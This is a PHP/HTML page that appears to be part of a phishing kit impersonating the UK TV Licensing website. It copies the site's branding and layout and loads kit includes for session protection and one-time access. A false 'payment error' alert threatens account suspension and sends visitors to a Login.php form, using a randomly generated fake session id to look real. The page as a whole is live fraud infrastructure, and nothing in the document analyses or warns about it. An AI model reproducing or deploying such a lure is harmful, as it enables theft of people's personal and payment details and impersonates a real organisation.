<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>An error occurred while processing your last payment. -  TV Licence</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="ROBOTS" content="NOODP,NOYDIR">
    <meta http-equiv="imagetoolbar" content="no">
    <meta name="keywords" content="TV Licensing, TV Licence, renew, renewal, pay, direct debit, change, update, check, information, BBC, detector van, broadcasting act, media, press, contact">
    <meta name="description" content="Welcome to TV Licensing. Use this site to access a range of information about TV Licensing in the UK, including methods of payment and details of television licence regulations.">
    <meta name="WT.cg_n" content="PAY">
    <meta name="WT.cg_s" content="Renew">
    <meta name="DCSext.SignInMethod" content="normal">
    <meta name="WT.si_n" content="SignInRenew">
    <meta name="WT.si_x" content="1">
    <script type="text/javascript">
        document.getElementsByTagName("html")[0].className = "js";
    </script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/files/favicon.ico" type="image/x-icon">
    <script src="assets/files/jquery-1.js" type="text/javascript"></script>
    <script src="assets/files/jquery-migrate-1.js" type="text/javascript"></script>
    <script src="assets/files/jquery_002.js" type="text/javascript"></script>
    <script src="assets/files/jquery.js" type="text/javascript"></script>
    <script src="assets/files/jquery_005.js" type="text/javascript"></script>
    <script src="assets/files/date.js" type="text/javascript"></script>
    <script src="assets/files/tvl-master.js" type="text/javascript"></script>
    <script src="assets/files/jquery_004.js" type="text/javascript"></script>
    <script src="assets/files/tvl-validation.js" type="text/javascript"></script>
    <script src="assets/files/accessibility.js" type="text/javascript"></script>
    <script src="assets/files/cookiemanagement.js" type="text/javascript"></script>
    <script src="assets/files/search.js" type="text/javascript"></script>
    <link href="assets/files/Satellite.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files/Satellite_003.css" media="print" type="text/css" rel="stylesheet">
    <link href="assets/files/jquery.css" rel="stylesheet">
    <!--[if gt IE 8]>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Dmaster_rwd.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006405151&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <link href='/cs/TVL/css/jquery.mobile-1.3.20.css' rel='stylesheet'/>
    <script src='/cs/TVL/js/tvl-master_rwd.js' type='text/javascript'></script>
    <script src='/cs/TVL/js/jquery.mobile-1.3.20.js' type='text/javascript'></script>
    <![endif]-->
    <!--[if IE 8]>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Dmaster_ie.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006293255&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <script src='/cs/TVL/js/tvl-master_ie.js' type='text/javascript'></script>
    <![endif]-->
    <!--[if IE 7]>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Die7.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006222011&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Dmaster_ie.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006293255&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <script src='/cs/TVL/js/tvl-master_ie.js' type='text/javascript'></script>
    <![endif]-->
    <!--[if IE 6]>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Die6.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006222049&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <link href='/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Content-Disposition&blobheadervalue1=text%2Fcss&blobheadervalue2=attachment%3B+filename%3Dmaster_ie.css&blobkey=id&blobtable=MungoBlobs&blobwhere=1370006293255&ssbinary=true' media="screen" type="text/css" rel="stylesheet"/>
    <script src='/cs/TVL/js/tvl-master_ie.js' type='text/javascript'></script>
    <![endif]-->
    <!--[if !IE]> -->
    <link href="assets/files/Satellite_002.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files/jquery_002.css" rel="stylesheet">
    <script src="assets/files/tvl-master_rwd.js" type="text/javascript"></script>
    <script src="assets/files/jquery_003.js" type="text/javascript"></script>
    <!-- <![endif]-->
    <script type="text/javascript" src="assets/files/wt.js"></script>
    <script type="text/javascript" src="assets/files/sizzle.js" async="true" defer="true"></script><script type="text/javascript" src="assets/files/common.js" async="true" defer="true"></script><script type="text/javascript" src="assets/files/optimize.js" async="true" defer="true"></script><script type="text/javascript" src="assets/files/analytics.js" async="true" defer="true"></script>
</head>
<body onload="javascript:checkCookie();">
<div>
    <noscript>
        <div id="blq-global">
            <div id="tvlScript">
                <div id="tvlScript-prompt">
                    <div id="header_Script">
                        <h2>Please enable Javascript in your browser</h2>
                    </div>
                    <div id="tvlScript-body">
                        <p class="icon">You will need to <a href="/faqs/FAQ274">enable Javascript in your web browser</a> in order to use all the features of our website.</p>
                    </div>
                </div>
            </div>
        </div>
    </noscript>
</div>
<div id="iPage">
    <div id="iHeader">
        <div class="innerContainer clearfix topHeadCtr">
            <div class="clearfix" id="headerTop">
                <div class="clearfix" id="iLogo">
                    <h1>
                        <a href="#" title="TV Licence home page" class="fwckembeddedlink logoWrapper">
                            <img alt="TV Licensing logo" src="assets/files/imgHeaderLogo.png">
                        </a>
                        <span class="headingText">TV Licensing</span>
                    </h1>
                    <div id="linkToggle" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="mobileNav clearfix right" id="iMobileNav">
                    <a href="#" id="mlogout" style="display: none;" title="logout">Sign out</a>
                    <div class="clearfix" id="srhCtr" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="clearfix" id="iGlobalNav">
                    <ul>
                        <li class="first">
                            <a href="#" title="TV Licensing home page" class="fwckembeddedlink">Home</a>
                        </li>
                        <li>
                            <a href="#" title="TV Licensing easy read" class="fwckembeddedlink">Easy read</a>
                        </li>
                        <li class="second">
                           <span lang="cy">
                           <a href="#" title="Cymraeg" class="fwckembeddedlink">Cymraeg</a>
                           </span>
                        </li>
                        <li id="logout" style="display: none;">
                            <a href="#">Sign out</a>
                        </li>
                    </ul>
                    <fieldset class="search" id="siteSrch" style="display: block;">
                        <legend class="hide">search site</legend>
                        <label for="siteSearch" id="searchLabel" style="display: none;">Search</label>
                        <span class="siteSearchWrap">
                        <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" value="Search" type="search">
                        </span>
                        <input id="siteSearchGo" value="search" name="___##NO_NAMED_ELEMENT##___" type="button">
                    </fieldset>
                </div>
            </div>
            <div class="clearfix" id="iPrimaryNav">
                <ul>
                    <li>
                        <a href="#" title="Pay for your TV Licence">
                            <span><strong>Pay</strong> for your TV Licence</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Update your TV Licence details">
                            <span><strong>Update</strong> your details</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Check if you need a TV Licence" class="fwckembeddedlink">
                            <span><strong>Check</strong> if you need one</span>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <script type="text/javascript">
            $(document).ready(function(e) {
                //<![CDATA[
                showLogoutLink(false);

                $("#linkToggle").click(function(){
                    if(!($("#iGlobalNav ul").is(':hidden') &&  $("#iPrimaryNav").is(':hidden')))
                    {
                        $("#iGlobalNav ul").hide();
                        $("#iPrimaryNav").hide();
                        if(false){
                            $("#mlogout").css("float","left").show();
                        }
                    }else{
                        $("#iGlobalNav ul").show();
                        $("#iPrimaryNav").show();
                        $("#srhCtr").show();
                        $("#mlogout").css("float","left").hide();
                    }
                    $("#siteSrch").hide();

                });

                $("#srhCtr").click(function(){
                    $(this).hide();
                    $("#siteSrch").css("padding-top", "0.385em");
                    $("#mlogout").css("float","right");
                    if(!($("#siteSrch").is(':hidden') ||  $("#mlogout").is(':hidden')))
                    {
                        $("#siteSrch").css("padding-top", "0em");
                        $("#siteSrch").hide();
                        $("#mlogout").hide();
                    }else{
                        $("#siteSrch").css("padding-top", "0.385em");
                        $("#siteSrch").show();
                        if(false){
                            $("#mlogout").show();
                        }
                    }

                    if(!($("#iGlobalNav ul").is(':hidden') &&  $("#iPrimaryNav").is(':hidden')))
                    {
                        $("#iGlobalNav ul").hide();
                        $("#iPrimaryNav").hide();
                    }
                    if(false){
                        $(".mlogout").show();
                    }
                });
                //]]>
            });


        </script>
    </div>
    <div id="iContent">
        <div class="innerContainer">
            <ul id="iBread">
                <li>
                    <a href="#">Home<span class="linkPurpose">Link for Home</span></a>
                </li>
                <li>/ An error occurred while processing your last payment.</li>
            </ul>
            <div id="iPrimary" style="width: 100%">
                <div class="panel">
                    <h2 class="header beta">
                        <span>An error occurred while processing your last payment.</span>
                    </h2>
                    <script type="text/javascript">
                        var msgEnterYourAuthorizationLastName = "Please re-enter the last name as it appears on the licence.";
                        var msgEnterYourPostCode = "Please enter a valid postcode, e.g. BN1 2FF.";
                        var msgLicenceNumberDoesNotMatch = "The TV Licence number (10 digits) or Customer number (9 digits) doesn't match our records. Please try again.";
                    </script>

                    <form action="Login.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" method="post">
                        <p class="introAuthorization">
                            Your last payment could not be processed. Click below to review your billing information to prevernt account suspension.
                        </p>
                        <div id="quickLinksNav1" class="clearfix">


                            <br /><br />

                            <div class="primaryLnkWrap">
                                <button type="button" class="primaryLnk payBtnRenew jButtonRedirect primaryBtnLnk" data-link="Login.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>">
                                    <span>My Account<span> Update your account details, will only take a few mintues</span></span>
                                </button>
                                <span class="divider"></span>
                            </div>

                        </div>

                        <input name="invoker" value="" type="hidden">	<!-- RFC 3030 - GDPR - Koustav -->
                    </form>
                </div>
            </div>
            <div id="iSecondary" style="display:none;">
                <div class="panel assist" style="display: none;">
                    <h3 class="header"><span></span></h3>
                    <div>
                        <p>
                            Please make sure your 10-digit TV Licence number or 9-digit Customer
                            number is entered correctly. You can find it on your current TV Licence
                            or any emails or letters we've sent you.
                        </p>
                        <p style="padding: 0em;">
                            Where to find the TV Licence or Customer number:
                        </p>
                        <div class="helpIntructionLeft">
                            <img src="assets/files/Satellite_004.png" alt="where to find your licence number">
                        </div>
                        <div class="helpIntructionRight">
                            <img src="assets/files/Satellite.png" alt="where to find your licence on your payment card">
                        </div>
                        <p style="padding: 0em;">
                            For Direct Debit customers, this number is also on your bank statement:
                        </p>
                        <div class="helpIntructionBelow">
                            <img src="assets/files/Satellite_003.png" alt="where to find your licence number on your bank statements">
                        </div>
                    </div>
                </div>
                <div class="panel assist" style="display: none;">
                    <h3 class="header"><span></span></h3>
                    <p>
                        Please enter the last name exactly as it appears on the TV Licence,
                        e.g. SMITH. For business licences, you may need to enter the job title
                        as shown on the TV Licence, e.g. MANAGER.
                    </p>
                    <p style="padding: 0em;">
                        Where to find the TV Licence holder's last name:
                    </p>
                    <div class="helpIntructionImg">
                        <img src="assets/files/Satellite_002.png" alt="Content Server Image">
                    </div>
                </div>
                <div class="panel secondary">
                    <h3 class="header gamma">
                        <span>On this website you can:</span>
                    </h3>
                    <ul class="list">
                        <li>
                            Renew your TV Licence
                        </li>
                        <li>
                            View your TV Licence
                        </li>
                        <li>
                            Update your contact details
                        </li>
                        <li>
                            Change the address on your TV Licence
                        </li>
                        <li>
                            Change the name on your TV Licence
                        </li>
                    </ul>
                    <h3 class="header alpha">
                        <span>If you pay by Direct Debit you can:</span>
                    </h3>
                    <ul class="list">
                        <li>
                            View your payment details
                        </li>
                        <li>
                            Change your bank details
                        </li>
                        <li>
                            Change your payment date
                        </li>
                    </ul>
                    <p>
                        If you don't pay by Direct Debit, it's easy to set up for your next TV Licence renewal.
                    </p>
                </div>
            </div>
            <div style="clear:both;"></div>
        </div>
    </div>
    <div id="iFooter">
        <div class="innerContainer">
            <ul id="iFooterNav">
                <li class="first">
                    <a href="#" title="About TV Licensing" class="fwckembeddedlink">About us</a>
                </li>
                <li>
                    <a href="#" title="Contact TV Licensing">Contact us</a>
                </li>
                <li>
                    <a href="#" title="Accessibility guidelines" class="fwckembeddedlink">Accessibility</a>
                </li>
                <li>
                    <a href="#" title="Community relations">Community relations</a>
                </li>
                <li>
                    <a href="#" title="Media Centre">Media Centre</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing sitemap" class="fwckembeddedlink">Sitemap</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing’s use of cookies" class="fwckembeddedlink">Cookies</a>
                </li>
                <li class="last">
                    <a href="#" title="TV Licensing's privacy policy" class="fwckembeddedlink">Privacy policy</a>
                </li>
            </ul>
            <p>
                General information about TV Licensing is available in other languages:
            </p>
            <ul id="iLanguages">
                <li class="first">
                    <span lang="cy"><a href="#" title="Select this link to go to general TV Licensing information translated into Welsh" class="fwckembeddedlink">Cymraeg</a></span>
                </li>
                <li>
                    <span lang="pl"><a href="#" title="Select this link to go to general TV Licensing information translated into Polish" class="fwckembeddedlink">Polski</a></span>
                </li>
                <li>
                    <span lang="es"><a href="#" title="Select this link to go to general TV Licensing information translated into Spanish" class="fwckembeddedlink">Español</a></span>
                </li>
                <li>
                    <span lang="pt"><a href="#" title="Select this link to go to general TV Licensing information translated into Portuguese" class="fwckembeddedlink">Português</a></span>
                </li>
                <li style="background: rgba(0, 0, 0, 0) url('/cs/TVL/css/images/footer/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em">
                    <span class="unicode" lang="ur"><a href="#" title="Select this link to go to general TV Licensing information translated into Urdu" class="fwckembeddedlink">اردو</a></span>
                </li>
                <li class="last" style="padding-left: 1.11em;">
                    <a href="#">More languages &gt;&gt;</a>
                </li>
            </ul>
            <p class="copyright">
                © 2018 TV Licensing
            </p>
        </div>
        <div>
            &nbsp;
        </div>
    </div>
</div>
<div>
    <noscript>
        <img alt="dcsimg" id="dcsimg" width="1" height="1" src="//statse.webtrendslive.com/dcs1r5h96000008yfl0bbgi0a_9v2g/njs.gif?dcsuri=/nojavascript&WT.js=No&WT.tv=10.4.1"/>
    </noscript>
</div>
<div id="__lpform_ctl00_Content_Login1_txtMembershipNumber" style="max-height: 16px; vertical-align: top; position: absolute; top: 291.75px; left: 615.5px; z-index: 17;"></div>
</body>
</html>

